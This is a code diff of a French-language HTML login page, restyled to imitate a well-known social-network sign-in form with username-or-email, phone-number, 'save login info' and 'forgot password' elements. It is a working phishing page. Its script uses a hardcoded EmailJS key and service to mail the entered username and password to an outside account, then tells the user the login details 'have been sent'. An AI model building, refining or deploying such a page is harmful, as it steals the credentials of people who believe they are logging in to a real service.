@@ -15,7 +15,7 @@
       margin: 0;
     }
     .container {
-      width: 300px;
+      width: 280px; /* Augmenté la largeur */
       padding: 20px;
       background-color: #fff;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
@@ -23,77 +23,142 @@
       text-align: center;
     }
     h2 {
-      color: #ff6f61;
+      color: #000000;
+      font-size: 28px; /* Augmenté la taille de la police */
     }
+
+    h3 {
+      color: #66b1efed;
+      font-size: 15px; /* Augmenté la taille de la police */
+      text-align: left;
+      margin-bottom: 8px; /* Ajouter un espace pour une meilleure lisibilité */
+    }
+
     .field {
-      margin-bottom: 15px;
+      margin-bottom: 28px;
     }
     .field label {
       display: block;
-      font-size: 14px;
+      font-size: 16px; /* Augmenté la taille de la police */
       margin-bottom: 5px;
     }
     .field input {
       width: 100%;
       padding: 10px;
-      font-size: 14px;
+      font-size: 16px; /* Augmenté la taille de la police */
       border: 1px solid #ccc;
       border-radius: 4px;
     }
+    .field input[type="text"] {
+      color: #008cff; /* Bleu clair */
+    }
+    .link {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 16px; /* Augmenté la taille de la police */
+      color: #008cff;
+      text-decoration: none;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center; /* Aligner le check avec la phrase */
+      margin-bottom: 15px; /* Ajusté pour un meilleur espacement */
+      font-size: 16px; /* Augmenté la taille de la police */
+    }
+    .checkbox-container input {
+      margin-right: 10px; /* Augmenté l'espacement entre le check et la phrase */
+      accent-color: #008cff; /* Check en bleu clair */
+    }
+    .checkbox-container label {
+      margin: 0;
+      line-height: 1.4; /* Ajuster l'espacement des lignes */
+      display: flex;
+      align-items: center; /* Aligner verticalement le texte avec le check */
+    }
     .field input[type="submit"] {
-      background-color: #ff6f61;
-      color: #fff;
+      background-color: #ccc; /* Gris */
+      color: #ffffff;
       border: none;
       cursor: pointer;
+      padding: 10px;
+      font-size: 16px; /* Augmenté la taille de la police */
+      border-radius: 20px; /* Contours plus arrondis */
+      margin-top: 30px; /* Faire descendre plus en bas */
+      width: 80%; /* Réduire la largeur du bouton */
     }
     .field input[type="submit"]:hover {
-      background-color: #e55b4f;
+      background-color: #bbb;
+    }
+    .forgot-password {
+      color: #008cff; /* Bleu clair */
+      display: block;
+      margin-bottom: 20px; /* Espacement avant le bouton de connexion */
+    }
+    #confirmation {
+      display: none;
+      color: green;
+      font-size: 16px; /* Augmenté la taille de la police */
     }
   </style>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
   <script type="text/javascript">
     (function() {
-      emailjs.init('g4HTytQL092Xue3Ar'); // Remplacez par votre user ID
+      emailjs.init('g4HTytQL092Xue3Ar'); // Clé publique
     })();
   </script>
 </head>
 <body>
   <div class="container">
     <h2>Connexion</h2>
-    <form id="loginForm">
+    <form id="form">
       <div class="field">
-        <label for="username">Nom d'utilisateur</label>
-        <input type="text" id="username" name="username" required>
+        <h3><label for="username">NOM D'UTILISATEUR OU ADRESSE E-MAIL</label></h3>
+        <input type="text" name="username" id="username">
       </div>
+      <h3><a href="#" class="link">Utiliser mon numéro de téléphone</a></h3>
       <div class="field">
-        <label for="password">Mot de passe</label>
-        <input type="password" id="password" name="password" required>
+        <h3><label for="password">MOT DE PASSE</label></h3>
+        <input type="password" name="password" id="password">
       </div>
+      <div class="checkbox-container">
+        <input type="checkbox" id="save-info">
+        <label for="save-info">Enregistrer les informations de connexion sur votre appareil</label>
+      </div>
+      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
       <div class="field">
-        <input type="submit" value="Se connecter">
+        <input type="submit" id="button" value="Connexion">
       </div>
     </form>
-    <div id="confirmation" style="display:none;color:green;">
-      Les informations de connexion ont été envoyées!
+    <div id="confirmation">
+      Les informations de connexion ont été envoyées !
     </div>
   </div>
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
+    const btn = document.getElementById('button');
+
+    document.getElementById('form').addEventListener('submit', function(event) {
       event.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+      btn.value = 'Envoi...';
 
-      emailjs.send("service_7xtpexj", "template_izsur1x", {
-        username: username,
-        password: password
-      })
-      .then(function(response) {
-        console.log('SUCCESS!', response.status, response.text);
-        document.getElementById('confirmation').style.display = 'block';
-      }, function(error) {
-        console.log('FAILED...', error);
-      });
+      console.log('Envoi en cours...');
+
+      const serviceID = 'service_7xtpexj';
+      const templateID = 'template_3jr5npg';
+
+      emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+          console.log('Email envoyé avec succès');
+          btn.value = 'Connexion';
+          document.getElementById('confirmation').style.display = 'block';
+        }, (err) => {
+          console.error('Erreur lors de l\'envoi de l\'email :', err);
+          btn.value = 'Connexion';
+          alert(JSON.stringify(err));
+        });
     });
   </script>
 </body>
